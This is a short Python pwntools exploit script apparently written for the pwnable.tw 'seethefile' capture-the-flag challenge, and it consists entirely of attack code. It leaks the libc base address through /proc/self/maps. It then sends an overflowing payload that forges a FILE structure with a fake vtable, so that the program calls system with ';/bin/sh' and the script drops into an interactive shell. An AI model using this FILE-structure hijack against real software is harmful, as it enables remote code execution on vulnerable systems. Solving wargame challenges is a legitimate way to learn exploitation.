from pwn import *



#s = process("/root/seethefile")
s = remote("chall.pwnable.tw",10200)
raw_input("wait")
fake_file_ptr = 0x0804B284
bss = 0x0804B624
xchgeaxesp = 0x08048b85
name_ptr = 0x0804B260

s.recvuntil("Your choice :")
s.sendline("1")
s.recvuntil("do you want to see :")
s.sendline("/proc/self/maps")
s.recvuntil("Your choice :")
s.sendline("2")

s.recvuntil("Your choice :")
s.sendline("3")
data = s.recvuntil("[heap]\n")
libc_base = int(s.recv(8),16) + 0x1000
libc_system = libc_base + 0x0003a940
print hex(libc_base)
s.recvuntil("Your choice :")
s.sendline("5")
payload  = p32(libc_system)+"a"*(0x20-4) + p32(fake_file_ptr)
payload += p32(0xaaaaaaaa) + ";/bin/sh" + p32(0)*1
payload += p32(0)*8
payload += p32(0) + p32(bss) +p32(1) + p32(0)
payload += p32(0xffffffff) + p32(0) + p32(bss) + p32(0xffffffff)
payload += p32(0xffffffff) + p32(0) + p32(bss) + p32(0)
payload += p32(0)*12 + p32(0)
payload += p32(name_ptr - 0x44)                            #vtable

s.sendline(payload)
s.interactive()
